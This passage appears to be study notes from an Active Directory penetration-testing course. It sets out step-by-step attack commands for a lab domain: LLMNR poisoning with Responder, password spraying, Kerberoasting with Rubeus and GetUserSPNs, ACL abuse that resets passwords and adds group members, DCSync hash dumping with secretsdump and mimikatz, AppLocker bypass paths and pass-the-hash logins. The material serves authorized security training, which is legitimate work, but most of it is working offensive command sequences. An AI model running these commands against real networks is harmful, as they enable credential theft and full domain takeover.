# Active Directory Penetration Testing - Complete Notes
### Compiled from HTB Academy Module: Active Directory Enumeration & Attacks

---

# TABLE OF CONTENTS

1. [LLMNR/NBT-NS Poisoning](#1-llmnrnbt-ns-poisoning)
2. [Password Policy Enumeration](#2-password-policy-enumeration)
3. [User Enumeration & Password Spraying](#3-user-enumeration--password-spraying)
4. [Security Controls Enumeration](#4-security-controls-enumeration)
5. [Credentialed Enumeration from Linux](#5-credentialed-enumeration-from-linux)
6. [Kerberoasting from Linux](#6-kerberoasting-from-linux)
7. [Kerberoasting from Windows](#7-kerberoasting-from-windows)
8. [ACL Overview](#8-acl-overview)
9. [ACL Enumeration](#9-acl-enumeration)
10. [ACL Abuse Tactics](#10-acl-abuse-tactics)
11. [DCSync Attack](#11-dcsync-attack)
12. [Privileged Access - RDP, WinRM, SQL](#12-privileged-access---rdp-winrm-sql)
13. [Kerberos Double Hop Problem](#13-kerberos-double-hop-problem)
14. [Bleeding Edge Vulnerabilities](#14-bleeding-edge-vulnerabilities)
15. [Miscellaneous Misconfigurations](#15-miscellaneous-misconfigurations)
16. [Domain Trusts Primer](#16-domain-trusts-primer)
17. [Attacking Domain Trusts - Child to Parent (Windows)](#17-attacking-domain-trusts---child-to-parent-windows)
18. [Attacking Domain Trusts - Child to Parent (Linux)](#18-attacking-domain-trusts---child-to-parent-linux)

---

# 1. LLMNR/NBT-NS Poisoning

## What is This Attack?

When a Windows machine cannot find a server via DNS, it broadcasts to the entire network asking "does anyone know where X is?" We reply "YES I AM X" and capture the victim's password hash.

```
Simple Story:
You (attacker with network access) → wait for LLMNR broadcast
Victim types wrong hostname → DNS fails → LLMNR broadcast
You reply "I am that server!" → victim sends NTLMv2 hash
You crack the hash → real credentials → domain foothold
```

## The Protocols

```
DNS (Normal): Computer → asks DNS server → gets IP → works fine

LLMNR (When DNS Fails):
Port 5355 UDP
Computer broadcasts to ENTIRE network
"ANYONE know where printer01 is??"
ANY machine can reply ← VULNERABILITY

NBT-NS (When LLMNR Also Fails):
Port 137 UDP
Older protocol, same concept
Uses NetBIOS names
Same vulnerability exists
```

## What Triggers This Attack

```
Human Mistakes:
✅ Typos in hostnames     \\fileserver → \\fileservr
✅ Wrong share names      \\backup01   → \\bakcup01
✅ Old bookmarks pointing to deleted servers

Automatic (No Human Needed):
✅ Service accounts run 24/7 automatically
✅ Scheduled tasks: backup jobs, scan jobs
✅ Windows background requests
✅ Broken applications pointing to old servers
```

## Identifying the Right Network Interface

```
Always run on the interface where VICTIMS are

Example ifconfig output:
docker0   172.17.0.1      → Docker containers  USELESS ❌
ens192    10.129.116.138  → HTB VPN connection USELESS ❌
ens224    172.16.5.225    → Internal network   USE THIS ✅
lo        127.0.0.1       → Loopback           USELESS ❌

How to confirm right interface:
nmap -p 445 172.16.5.0/23 --open   (port 445 = Windows)
fping -a -g 172.16.5.0/23 2>/dev/null
```

## Tool 1: Responder (Linux)

```bash
# Analyze mode first (safe, no poisoning)
sudo responder -I ens224 -A

# Active poisoning
sudo responder -I ens224

# With extra options (recommended)
sudo responder -I ens224 -wf
# -w = fake WPAD proxy server (catches browser traffic)
# -f = fingerprint victim OS

# Run in background with tmux
tmux new -s responder
sudo responder -I ens224
CTRL+B then D    # detach, keep running
tmux attach -t responder    # come back later

# Check captured hashes
ls /usr/share/responder/logs/
# Files: PROTOCOL-HASHTYPE-VICTIMIP.txt
```

## Tool 2: Inveigh (Windows)

```powershell
# PowerShell version
Import-Module .\Inveigh.ps1
Invoke-Inveigh -LLMNR Y -NBNS Y -ConsoleOutput Y -FileOutput Y
Stop-Inveigh

# C# version (better, run as Admin)
.\Inveigh.exe
.\Inveigh.exe -Sniffer N    # if socket errors

# Inside Inveigh console (press ESC first)
GET NTLMV2UNIQUE      → full hashes (crackable)
GET NTLMV2USERNAMES   → summary only (not crackable)
GET CLEARTEXT         → any cleartext passwords
STOP                  → stop Inveigh
```

## Common Inveigh Errors and Fixes

```
ERROR: "Error starting packet sniffer, check elevated privilege"
FIX: Right click PowerShell → Run as Administrator

ERROR: "Failed to start HTTP listener on port 80"
FIX: netstat -ano | findstr :80
     taskkill /PID [number] /F

ERROR: "GET is not recognized as cmdlet"
FIX: Press ESC first to enter Inveigh console THEN type GET commands
```

## Cracking Captured Hashes

```bash
# Save hash to file
echo "USERNAME::DOMAIN:CHALLENGE:HASH:BLOB" > hash.txt

# Crack NTLMv2 hash (mode 5600)
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Check already cracked
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show
```

## Hash Types Reference

```
NTLMv2    → -m 5600  ← most common from Responder
NTLMv1    → -m 5500
NT hash   → -m 1000  (pass the hash attacks)
```

## Key Reminders

```
1. Responder NEVER stops itself → you CTRL+C when done
2. Always use tmux → run in background
3. Hashes saved to /usr/share/responder/logs/ even after stopping
4. GET NTLMV2USERNAMES → just shows WHO (not crackable)
   GET NTLMV2UNIQUE    → shows FULL hash (crackable)
5. Press ESC first before typing GET commands in Inveigh
6. Always run Inveigh as Administrator
7. NTLMv2 hashes CANNOT be used for pass-the-hash → must crack
8. Service accounts trigger automatically 24/7
9. Longer run time = more hashes captured
```

---

# 2. Password Policy Enumeration

## Why Enumerate Password Policy?

Before password spraying, we MUST know:
- How many attempts before lockout?
- Minimum password length?
- Complexity requirements?

Without this → blind spraying → lock accounts → alert defenders.

## Method 1: CrackMapExec (With Credentials)

```bash
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

**Output key fields:**
```
Minimum password length: 8
Account Lockout Threshold: 5    ← max 3 sprays to be safe
Locked Account Duration: 30 mins ← wait 31 mins between sprays
Reset Account Lockout Counter: 30 minutes
Password Complexity: Enabled
Maximum password age: Not Set   ← passwords never expire
```

## Method 2: rpcclient (SMB NULL Session)

```bash
# Connect anonymously
rpcclient -U "" -N 172.16.5.5

# Inside rpcclient
rpcclient $> querydominfo    # domain info
rpcclient $> getdompwinfo    # password policy
```

## Method 3: enum4linux (SMB NULL)

```bash
enum4linux -P 172.16.5.5
```

## Method 4: enum4linux-ng (Better Version)

```bash
enum4linux-ng -P 172.16.5.5 -oA ilfreight
cat ilfreight.json
```

## Method 5: ldapsearch (LDAP Anonymous)

```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

## Method 6: Windows net.exe (Built-in)

```cmd
net accounts
```

## Method 7: PowerView

```powershell
Import-Module .\PowerView.ps1
Get-DomainPolicy
```

## Analyzing the Policy for Spraying

```
Policy                  Value    Meaning for Us
Lockout Threshold       5        Max 3 attempts safely
Lockout Duration        30 min   Wait 31 mins between sprays
Max Password Age        Not Set  Old passwords still work
Min Password Length     8        Try 8+ char passwords
Complexity Enabled      Yes      Need Upper+lower+number+symbol
```

## Anonymous Access - The Key Concept

```
ANONYMOUS ACCESS WORKS:      ANONYMOUS ACCESS BLOCKED:
rpcclient NULL session  ✅   All NULL methods fail   ❌
enum4linux              ✅   Need credentials first
ldapsearch -x           ✅
                             Only option: Kerbrute + Responder

ANY domain user works for:
→ crackmapexec with -u user -p pass
→ PowerView with valid credentials
→ All enumeration opens up
```

---

# 3. User Enumeration & Password Spraying

## Methods to Get User Lists

### enum4linux

```bash
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

### rpcclient

```bash
rpcclient -U "" -N 172.16.5.5
rpcclient $> enumdomusers
```

### CrackMapExec

```bash
# Without credentials (NULL session)
crackmapexec smb 172.16.5.5 --users

# With credentials (most complete)
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```

**Key field: badpwdcount** - skip accounts close to lockout threshold!

### ldapsearch + windapsearch

```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "

./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

### Kerbrute (No Credentials, No NULL Session Needed)

```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

**Why Kerbrute is special:**
- Uses Kerberos protocol (port 88)
- Does NOT generate Event ID 4625 (failed logon)
- Generates Event ID 4768 (TGT request) - less monitored
- Stealthier than other methods
- Works even when SMB NULL and LDAP anonymous blocked
- Automatically dumps AS-REP hashes for vulnerable accounts

**Save output:**
```bash
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt | tee ~/valid_users.txt

# Clean up to just usernames
grep "VALID USERNAME" valid_users.txt | cut -d: -f2 | tr -d " " | cut -d@ -f1 > clean_users.txt
```

## Password Spraying

### Using rpcclient (one-liner)

```bash
for u in $(cat ~/valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

**Successful login shows:** `Account Name: username, Authority Name: INLANEFREIGHT`

### Using Kerbrute

```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 ~/valid_users.txt Welcome1

# With downgrade flag (fixes encryption errors)
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 ~/valid_users.txt Welcome1 --downgrade
```

### Using CrackMapExec

```bash
# Spray single password
sudo crackmapexec smb 172.16.5.5 -u ~/valid_users.txt -p Welcome1 --continue-on-success

# Filter only successes
sudo crackmapexec smb 172.16.5.5 -u ~/valid_users.txt -p Password123 | grep +

# Validate found credentials
sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123
```

### Local Admin Hash Spraying

```bash
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

## Safe Spraying Rules

```
RULE 1: Always check badpwdcount before spraying
RULE 2: Spray LESS than threshold (threshold=5 → spray 3 max)
RULE 3: Wait 31+ minutes between sprays
RULE 4: Keep a log (accounts targeted, passwords tried, times)
RULE 5: When in doubt, ask client for password policy
RULE 6: One spray if you don't know the policy
```

---

# 4. Security Controls Enumeration

## Why Check Security Controls?

Before running ANY tools after getting foothold → check what security is running. Wrong tool + security enabled = CAUGHT.

## Windows Defender

```powershell
Get-MpComputerStatus

# Check specifically for real time protection
Get-MpComputerStatus | Select RealTimeProtectionEnabled
```

**Key field:**
```
RealTimeProtectionEnabled : True   ← tools will be caught/deleted
RealTimeProtectionEnabled : False  ← proceed normally
```

## AppLocker

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

**Common finding - PowerShell blocked:**
```
PathConditions: {%SYSTEM32%\WINDOWSPOWERSHELL\V1.0\POWERSHELL.EXE}
Action: Deny

Bypass: Use alternate paths
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe
C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe
```

## PowerShell Constrained Language Mode

```powershell
$ExecutionContext.SessionState.LanguageMode
```

```
ConstrainedLanguage → use C# compiled tools (SharpView, SharpHound)
FullLanguage        → use PowerShell tools normally
```

## LAPS (Local Administrator Password Solution)

```powershell
# Import LAPSToolkit
Import-Module LAPSToolkit.ps1

# Find who can read LAPS passwords
Find-LAPSDelegatedGroups

# Find users with extended rights to read LAPS
Find-AdmPwdExtendedRights

# Read LAPS passwords (if you have access)
Get-LAPSComputers
```

**LAPS impact:**
```
Without LAPS: Same local admin password on all machines
             → One password = own entire network

With LAPS: Unique random passwords per machine
           BUT find who can READ them → get all passwords anyway
```

## Security Controls Check Workflow

```
Step 1: Check Defender → RealTimeProtectionEnabled?
Step 2: Check AppLocker → any rules blocking tools?
Step 3: Check Language Mode → constrained or full?
Step 4: Check LAPS → who can read passwords?
```

---

# 5. Credentialed Enumeration from Linux

## CrackMapExec (CME)

```bash
# Domain user enumeration
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users > domain_users.txt

# Group enumeration
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups > groups.txt

# Logged on users (look for Pwn3d!)
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

# Share enumeration
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares

# Spider shares for files
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
cat /tmp/cme_spider_plus/172.16.5.5.json
```

**`(Pwn3d!)` = you are local admin on that machine** → use psexec or wmiexec

**High priority groups:**
```
Domain Admins, Enterprise Admins, Administrators
Backup Operators, Executives, IT Admins, Help Desk
```

## SMBMap

```bash
# Check permissions
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

# Recursive directory listing
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

## rpcclient (Authenticated)

```bash
rpcclient -U "forend%Klmcargo2" 172.16.5.5

# Inside rpcclient
rpcclient $> enumdomusers          # list all users with RIDs
rpcclient $> queryuser 0x457       # detailed info on specific user
rpcclient $> querydominfo          # domain information
```

**RID Reference:**
```
0x1f4 (500) = Administrator (always)
0x1f5 (501) = Guest (always)
0x1f6 (502) = krbtgt (always)
```

## Impacket Tools

### psexec.py (SYSTEM Shell - Noisy)

```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
# Gives SYSTEM level interactive shell
# Noisy = uploads executable to ADMIN$ share
```

### wmiexec.py (User Level - Stealthy)

```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
# Runs as the authenticating user
# No files dropped to disk
# Semi-interactive shell
```

## Windapsearch

```bash
# Find Domain Admins
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

# Find ALL privileged users (nested groups)
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

**Why `-PU` matters:** Finds users with elevated rights through nested group membership that direct membership checks would miss.

## BloodHound

```bash
# Collect all data
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all

# Zip and upload
zip -r ilfreight_bh.zip *.json
sudo neo4j start
bloodhound
```

**Most useful BloodHound queries:**
```
→ Find Shortest Paths to Domain Admins
→ Find Principals with DCSync Rights
→ Find Computers where Domain Admins are logged in
→ Find AS-REP Roastable Users
→ Shortest Paths from Kerberoastable Users
```

---

# 6. Kerberoasting from Linux

## What is Kerberoasting?

Any domain user can request a Kerberos TGS ticket for any SPN account. That ticket is encrypted with the service account's NTLM password hash. Crack the ticket offline = get the password.

```
You (regular user) → ask DC → "Give me ticket for SQL service"
DC says "Sure!" → hands encrypted ticket
You crack offline → get sqldev password = database!
sqldev is Domain Admin = You own everything
```

## Requirements

```
Minimum (any ONE):
✅ Regular domain user cleartext password
✅ NTLM hash of any domain user
✅ Shell in context of domain user
✅ SYSTEM access on domain-joined host
```

## Using GetUserSPNs.py

```bash
# List all SPN accounts (no tickets yet)
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

# With password in command
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend:Klmcargo2

# Request ALL TGS tickets
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request

# Request specific user only
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

# Save to file for cracking
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

**Analyzing SPN output:**
```
MemberOf column → priority targets
CN=Domain Admins → PRIORITY 1 = crack first
CN=Dev Accounts  → PRIORITY 2

PasswordLastSet → all same date = gold image deployment
LastLogon: never → might have default/weak password
```

## Cracking TGS Tickets

```bash
# RC4 (most common, fastest)
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --show
```

## Hash Mode Reference

```
RC4 TGS (etype 23)  → hashcat -m 13100
AES-128 (etype 17)  → hashcat -m 19600
AES-256 (etype 18)  → hashcat -m 19700
```

## Validate and Use

```bash
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
# Look for (Pwn3d!) = Domain Admin level
```

## Targeting Priority

```
HIGHEST: svc_*, backup*, admin* accounts
→ Service accounts have elevated privileges everywhere
→ Backup accounts have access to all servers
→ Crack these first
```

---

# 7. Kerberoasting from Windows

## Method 1: Semi-Manual (setspn + PowerShell + Mimikatz)

```cmd
# Enumerate SPNs
setspn.exe -Q */*

# Filter user accounts (skip computer accounts)
# Look for: CN=BACKUPAGENT, CN=sqldev, CN=SOLARWINDSMONITOR
```

```powershell
# Request ticket for specific SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

```
# Extract from memory with Mimikatz
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

```bash
# On Linux: Convert to crackable format
echo "[base64 blob]" | tr -d \\n > encoded.txt
cat encoded.txt | base64 -d > sqldev.kirbi
python2.7 kirbi2john.py sqldev.kirbi > crack_file
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_hashcat.txt
hashcat -m 13100 sqldev_hashcat.txt /usr/share/wordlists/rockyou.txt
```

## Method 2: PowerView

```powershell
Import-Module .\PowerView.ps1

# List SPN accounts
Get-DomainUser * -spn | select samaccountname

# Get ticket for specific user in Hashcat format
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

# Export ALL to CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

## Method 3: Rubeus (Most Powerful)

```powershell
# Stats only (no tickets requested - stealthiest)
.\Rubeus.exe kerberoast /stats

# Target admin accounts only
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# Specific user
.\Rubeus.exe kerberoast /user:sqldev /nowrap

# Save all to file
.\Rubeus.exe kerberoast /outfile:hashes.txt /nowrap

# Force RC4 even for AES accounts (Server 2016 and earlier only)
.\Rubeus.exe kerberoast /user:testspn /tgtdeleg /nowrap
```

**ALWAYS use `/nowrap`** → prevents line wrapping → easier to copy to hashcat.

## Check Encryption Types

```powershell
Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

```
msds-supportedencryptiontypes values:
0  → RC4 default = EASY to crack
24 → AES 128+256 = HARDER to crack
```

## Cracking Speed Comparison

```
Hash Type    Hashcat Mode   Speed (CPU)   Weak Password Time
RC4 (23)     -m 13100       ~821K H/s     Seconds
AES-128 (17) -m 19600       ~50K H/s      Minutes
AES-256 (18) -m 19700       ~10K H/s      4-5 minutes
```

---

# 8. ACL Overview

## What are ACLs?

Every AD object has an Access Control List defining who can do what to that object. Two types:

```
DACL (Discretionary ACL):
→ Controls WHO can access the object
→ Contains ACEs that ALLOW or DENY
→ Most important for attacks

SACL (System ACL):
→ Controls AUDITING (logging)
→ What gets logged when someone accesses the object
→ Defenders use this for monitoring
```

## ACE Components

Every ACE has 4 parts:
1. **WHO** - Security Identifier (SID) of user/group
2. **TYPE** - Allow, Deny, or Audit
3. **INHERITANCE** - Does it apply to child objects?
4. **ACCESS MASK** - What specific actions are allowed

## Exploitable ACE Permissions

| ACE | What It Does | How to Abuse |
|-----|-------------|-------------|
| ForceChangePassword | Reset user password without knowing current | Reset DA password → login as DA |
| GenericWrite | Write any non-protected attribute | Assign SPN → Kerberoast; Add to group |
| GenericAll | Full control of object | Everything above + LAPS passwords |
| WriteOwner | Change object owner | Take ownership → grant yourself rights |
| WriteDACL | Modify the ACL itself | Grant yourself GenericAll |
| AddSelf | Add yourself to group | Join privileged group |
| AllExtendedRights | All extended permissions | Reset password or add group members |

## Why ACLs Are Dangerous

```
1. Invisible to vulnerability scanners (Nessus, Qualys)
2. Often exist for years undetected
3. Using legitimate AD features = hard to detect
4. Common sources:
   → Software installs (Exchange adds 1000s of ACL changes)
   → Legacy configurations from years ago
   → Admin gave access "temporarily" and forgot
```

---

# 9. ACL Enumeration

## Targeted Enumeration with PowerView

```powershell
Import-Module .\PowerView.ps1

# Convert username to SID
$sid = Convert-NameToSid wley

# Find what wley has rights over (with readable output)
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

**Key output fields:**
```
ObjectDN              → WHAT OBJECT the ACE applies to (who we control)
ActiveDirectoryRights → WHAT type of right (GenericAll, WriteDACL, etc)
ObjectAceType         → SPECIFIC permission (User-Force-Change-Password)
SecurityIdentifier    → WHO has the right (our user's SID)
AceQualifier          → AccessAllowed or AccessDenied
IsInherited           → False = directly assigned (more interesting)
```

**Without `-ResolveGUIDs`:** ObjectAceType shows unreadable GUID
**With `-ResolveGUIDs`:** ObjectAceType shows "User-Force-Change-Password"

## Translate a GUID Manually

```powershell
$guid = "00299570-246d-11d0-a768-00aa006e0529"
Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * | Select Name,DisplayName,rightsGuid | ?{$_.rightsGuid -eq $guid} | fl
```

## Check Group Nesting

```powershell
Get-DomainGroup -Identity "Help Desk Level 1" | select memberof
# Shows if Help Desk Level 1 is nested inside another group
```

## BloodHound ACL Visualization

```
Click user → Node Info → Outbound Control Rights
→ First Degree Object Control: direct rights
→ Transitive Object Control: full attack chain

Right-click any edge → Help → attack instructions + commands
```

## The Attack Chain We Discovered

```
wley (ForceChangePassword) → damundsen
damundsen (GenericWrite) → Help Desk Level 1 group
Help Desk Level 1 (nested in) → Information Technology group
Information Technology (GenericAll) → adunn
adunn (DCSync rights) → INLANEFREIGHT.LOCAL domain
= Full domain compromise chain
```

---

# 10. ACL Abuse Tactics

## Step 1: Reset damundsen Password Using wley

```powershell
cd C:\Tools
Import-Module .\PowerView.ps1

# Create credentials for wley
$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

# Create new password for damundsen
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

# Reset damundsen's password
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

## Step 2: Add damundsen to Help Desk Level 1

```powershell
# Create credentials for damundsen
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)

# Verify damundsen not in group yet
Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

# Add damundsen to group
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

# Confirm addition
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName
```

## Step 3: Targeted Kerberoasting on adunn

```powershell
# Add fake SPN to adunn (using damundsen's GenericAll via IT group nesting)
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

# Kerberoast adunn
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

```bash
# Crack on Linux
echo '$krb5tgs$23$*adunn$...' > adunn_hash.txt
hashcat -m 13100 adunn_hash.txt /usr/share/wordlists/rockyou.txt
```

## Cleanup (MUST DO IN THIS ORDER)

```powershell
# Step 1: Remove SPN FIRST (before losing GenericAll)
Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose

# Step 2: Remove from group
Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose

# Step 3: Verify removal
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName | ? {$_.MemberName -eq 'damundsen'}

# Step 4: Notify client about damundsen password change
```

**Cleanup order is CRITICAL:** Remove SPN first → then remove from group. Reverse order = lose the permission = SPN stays forever.

## Detection via Event ID 5136

```powershell
# Defenders decode SDDL strings from logs
ConvertFrom-SddlString "[SDDL STRING]" | select -ExpandProperty DiscretionaryAcl

# Shows readable permissions like:
# INLANEFREIGHT\mrb3n: AccessAllowed (GenericWrite, ...)
# = Clear indicator of ACL attack
```

---

# 11. DCSync Attack

## What is DCSync?

DCSync pretends to BE a Domain Controller and asks the real DC to "replicate" (send) all password hashes. The DC has no way to tell we are not legitimate, so it sends everything.

```
Normal DC Replication:
DC1 → asks DC2 → "send me all changes"
DC2 → sends all hashes → DC1 updates

DCSync Attack:
Attacker → pretends to be DC1
Attacker → asks real DC → "send me all changes"
DC → sends ALL hashes → Attacker captures everything
= Every user's NTLM hash including Administrator and krbtgt
```

## Requirements

```
BOTH permissions needed on domain object:
1. DS-Replication-Get-Changes
2. DS-Replication-Get-Changes-All

Who normally has these:
→ Domain Admins (by default)
→ Enterprise Admins (by default)
→ Domain Controllers (by default)
→ adunn (misconfiguration = our way in)
```

## Verify DCSync Rights

```powershell
$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} | select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl
```

## Method 1: secretsdump.py (Linux)

```bash
# Full dump
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5

# NTLM hashes only
secretsdump.py -outputfile inlanefreight_hashes -just-dc-ntlm INLANEFREIGHT/adunn@172.16.5.5

# Specific user
secretsdump.py -just-dc-user administrator INLANEFREIGHT/adunn@172.16.5.5

# With history and status
secretsdump.py -outputfile inlanefreight_hashes -just-dc -history -pwd-last-set -user-status INLANEFREIGHT/adunn@172.16.5.5

# View output files
ls inlanefreight_hashes*
cat inlanefreight_hashes.ntds           # NTLM hashes
cat inlanefreight_hashes.ntds.cleartext # cleartext passwords
cat inlanefreight_hashes.ntds.kerberos  # Kerberos keys
```

## Method 2: Mimikatz (Windows)

```cmd
# Launch PowerShell as adunn
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

```powershell
cd C:\Tools
.\mimikatz\x64\mimikatz.exe
```

```
mimikatz # privilege::debug

# Get administrator hash
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator

# Get krbtgt hash (for Golden Tickets)
mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\krbtgt
```

## Hash Format

```
username:RID:LMhash:NTLMhash:::
administrator:500:aad3b435...:88ad09182de639ccc6579eb0849751cf:::
                               ↑ THIS is the NTLM hash (4th field)

Pass-the-Hash:
crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf

Crack with hashcat:
hashcat -m 1000 admin_hash.txt /usr/share/wordlists/rockyou.txt
(mode 1000 = NTLM hash, NOT 5600 or 13100)
```

## Find Reversible Encryption Accounts

```powershell
# Method 1: Get-ADUser
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

# Method 2: PowerView
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} | select samaccountname,useraccountcontrol
```

```bash
# View cleartext passwords after DCSync
cat inlanefreight_hashes.ntds.cleartext
# proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
```

---

# 12. Privileged Access - RDP, WinRM, SQL

## Remote Desktop Protocol (RDP)

```powershell
# Enumerate RDP users on a machine
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

**BloodHound:** Analysis → "Find Workstations where Domain Users can RDP"

```bash
# Connect via RDP from Linux
xfreerdp /u:forend /p:Klmcargo2 /d:INLANEFREIGHT.LOCAL /v:172.16.5.25
```

## WinRM (Windows Remote Management)

```powershell
# Enumerate WinRM users
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

**BloodHound Cypher Query:**
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

```powershell
# Connect from Windows
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
Exit-PSSession
```

```bash
# Connect from Linux (evil-winrm)
gem install evil-winrm
evil-winrm -i 10.129.201.234 -u forend -p Klmcargo2
evil-winrm -i 10.129.201.234 -u forend -H [NTLM_HASH]   # Pass-the-Hash
```

## SQL Server Admin

```powershell
# Find SQL instances in domain
cd .\PowerUpSQL\
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain

# Run SQL query
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

```bash
# Connect from Linux
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

```sql
